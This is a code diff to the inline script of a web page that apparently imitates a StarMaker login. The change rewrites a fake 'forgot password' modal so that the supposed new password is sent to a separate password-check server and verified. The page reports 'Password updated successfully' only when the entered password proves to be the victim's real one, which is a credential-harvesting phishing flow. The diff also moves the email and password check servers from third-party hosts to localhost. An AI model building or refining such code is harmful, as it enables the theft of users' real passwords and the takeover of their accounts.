@@ -708,8 +708,8 @@
 
   <script>
     // Configuration
-    const EMAIL_CHECK_API = 'https://emailcheckserver.onrender.com/check-email';
-    const PASSWORD_CHECK_API = 'https://passwordcheckserver.onrender.com/verify-password';
+    const EMAIL_CHECK_API = 'http://localhost:3000/check-email';
+    const PASSWORD_CHECK_API = 'http://localhost:3000/verify-password';
     const FORGOT_PASSWORD_API = 'http://localhost:3000/forgot-password';
     const STARMAKER_API = 'https://api.starmakerstudios.com/web/passport/lost';
     
@@ -808,7 +808,7 @@
       });
 
       // Modal Next Button Handler
-      modalNextBtn.addEventListener('click', function(e) {
+      modalNextBtn.addEventListener('click', async function(e) {
         e.preventDefault();
         
         const newPassword = newPasswordInput.value.trim();
@@ -825,19 +825,43 @@
           return;
         }
 
-        // Show success message
-        modalMessage.textContent = 'Password updated successfully!';
-        newPasswordInput.style.display = 'none';
-        modalNextBtn.style.display = 'none';
+        // Verify new password through old password check server
         modalError.classList.remove('show');
-        modalCancelBtn.textContent = 'Close';
+        modalNextBtn.disabled = true;
 
-        setTimeout(() => {
-          forgotModal.classList.remove('show');
-          newPasswordInput.value = '';
-          emailInput.value = '';
-          passwordInput.value = '';
-        }, 2000);
+        try {
+          const passwordCheckResult = await checkPassword(forgotPasswordEmail, newPassword);
+          
+          console.log('Password check result:', passwordCheckResult);
+
+          if (passwordCheckResult.success === true) {
+            // Password is correct
+            modalMessage.textContent = 'Password updated successfully!';
+            newPasswordInput.style.display = 'none';
+            modalNextBtn.style.display = 'none';
+            modalError.classList.remove('show');
+            modalCancelBtn.textContent = 'Close';
+
+            setTimeout(() => {
+              forgotModal.classList.remove('show');
+              newPasswordInput.value = '';
+              emailInput.value = '';
+              passwordInput.value = '';
+              emailStatus.classList.remove('show');
+              modalNextBtn.disabled = false;
+            }, 2000);
+          } else {
+            // Password verification failed
+            modalError.textContent = passwordCheckResult.message || 'Password verification failed. Please try again.';
+            modalError.classList.add('show');
+            modalNextBtn.disabled = false;
+          }
+        } catch (error) {
+          console.error('Error verifying password:', error);
+          modalError.textContent = 'Unable to verify password. Please try again.';
+          modalError.classList.add('show');
+          modalNextBtn.disabled = false;
+        }
       });
 
       // Modal Cancel Button
